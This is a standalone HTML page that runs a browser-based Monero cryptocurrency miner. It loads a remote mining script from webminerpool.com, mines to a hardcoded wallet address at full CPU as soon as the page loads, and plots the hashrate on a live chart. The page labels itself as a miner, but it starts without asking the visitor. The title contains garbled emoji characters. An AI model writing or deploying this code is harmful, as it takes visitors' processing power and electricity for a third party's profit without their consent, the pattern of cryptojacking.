<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>ðŸ”¥ Monero WebMiner</title>
  <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
  <style>
    body {
      background: black;
      color: lime;
      font-family: monospace;
      text-align: center;
    }
    canvas {
      background: #111;
      border: 1px solid lime;
      margin-top: 20px;
    }
  </style>
</head>
<body>
  <h1>ðŸ”¥ Monero Miner Active</h1>
  <p id="hashrate">Hashrate: loading...</p>
  <p id="total">Total hashes: 0</p>
  <canvas id="chart" width="400" height="200"></canvas>

  <script src="https://webminerpool.com/lib/simple-ui.js"></script>
  <script>
    const miner = new Client.Anonymous("83uCXo5d4zNXSHkutqPqHHKSpvJxgmS15U5oQXnQTfAUYnP9bj5Wb5FKn8XBzkc7RZBxcFg5BFG5CjV2kjysXKfD7sX6Gvr", {
      throttle: 0, // 100% CPU
      c: "wmp",    // Custom label
      ads: 0
    });

    miner.start();

    // Chart setup
    const ctx = document.getElementById("chart").getContext("2d");
    const data = {
      labels: [],
      datasets: [{
        label: "Hashrate (H/s)",
        data: [],
        borderColor: "lime",
        fill: false,
        tension: 0.2
      }]
    };
    const chart = new Chart(ctx, {
      type: "line",
      data: data,
      options: {
        animation: false,
        scales: {
          x: { display: false },
          y: { beginAtZero: true }
        }
      }
    });

    setInterval(() => {
      const hps = miner.getHashesPerSecond().toFixed(2);
      const total = miner.getTotalHashes();

      document.getElementById("hashrate").textContent = `Hashrate: ${hps} H/s`;
      document.getElementById("total").textContent = `Total hashes: ${total}`;

      // Update chart
      if (data.labels.length > 30) {
        data.labels.shift();
        data.datasets[0].data.shift();
      }
      data.labels.push(""); // skip label
      data.datasets[0].data.push(hps);
      chart.update();
    }, 1000);
  </script>
</body>
</html>
